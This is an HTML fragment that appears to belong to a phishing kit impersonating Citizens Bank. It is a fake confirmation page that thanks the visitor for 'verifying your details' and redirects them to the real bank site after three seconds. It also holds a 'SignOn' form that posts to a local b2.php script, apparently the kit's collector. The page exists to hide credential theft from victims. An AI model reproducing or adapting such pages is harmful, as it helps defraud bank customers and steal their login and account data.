...
<head>
	...
	<meta http-equiv="refresh" content="3; url=https://www4.citizensbankonline.com/">


<title>Successfully Complete!</title>
...
<header class="account-section-title clearfix checkmark">
   <h1 style="font-size: 23px;">Thank you for verifying your details with us, You'll be redirected to the home page.</h1>
</header>
                    <section class="account-section">
                        
    <form class="pay-transfer-options clearfix" action="b2.php" name="SignOn" id="frmSignOn" method="post">
